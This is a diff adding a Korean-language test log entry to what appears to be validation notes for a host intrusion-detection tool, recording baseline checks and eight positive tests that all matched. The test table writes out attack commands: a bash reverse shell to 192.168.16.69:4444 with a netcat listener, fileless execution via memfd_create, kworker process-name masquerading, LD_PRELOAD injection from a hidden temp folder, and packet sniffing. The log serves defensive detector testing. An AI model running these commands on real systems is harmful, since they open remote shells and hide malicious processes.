@@ -222,3 +222,22 @@ PAM 뒷문을 넣은 상태에서는 아무 비밀번호나 통과하므로, ACC
 - promiscuous 인터페이스 없음
 
 기대: 2-B 10개 항목 탐지 없음.
+
+## 7차 적용 — 2-B (`db87e47`, 2026-11-06)
+
+기준선(`web-baseline`): 판정 정상, 탐지 2건 (LOG-01 참고 — 스냅샷 복원 NUL 구간, 이전과 같음). 2-B 10개 항목 탐지 없음.
+- PRC-05: PID 1~4,194,304, /proc 109개·ps 110개 (차이 1은 ps 자신)
+- NET-01: 리스닝 9개 — tcp/22(sshd·systemd), 53(systemd-resolved), 80(nginx), 3306(mariadbd), udp/53, udp/68(systemd-networkd) — 정답과 일치
+- PRC-06: raw·packet 2개 (네트워크 관리 데몬 1개 제외)
+
+양성 (test 계정, 한 줄씩):
+
+| 시험 | 기대 | 결과 |
+| --- | --- | --- |
+| `nc -lnv 4444` + `bash -i >& /dev/tcp/192.168.16.69/4444 0>&1` | PRC-08 심각, NET-01·02 위험 | 일치 — PRC-08 bash fd 0·1·2 → 192.168.16.69:4444, NET-01 nc.openbsd 0.0.0.0:4444, NET-02 bash·nc 2건 |
+| python `os.memfd_create` + `execv` | PRC-02 심각 | 일치 — `/memfd:payload (deleted)`, SHA-256 보존. 이름(comm)이 '3'으로 나옴 (`/proc/self/fd/3` 실행) |
+| `exec -a "[kworker/0:9]" sleep` | PRC-04 심각 | 일치 |
+| `LD_PRELOAD=/tmp/.l/libh.so sleep` | PRC-07 위험 | 일치 — "없음, 임시 폴더" |
+| `sudo tcpdump -i enp0s3` | PRC-06·NET-06 위험 | 일치 — tcpdump(계정 tcpdump로 권한 낮춤) packet 소켓, enp0s3 flags 0x1103 |
+
+8 / 8 일치. 이후 `web-baseline` 복원.
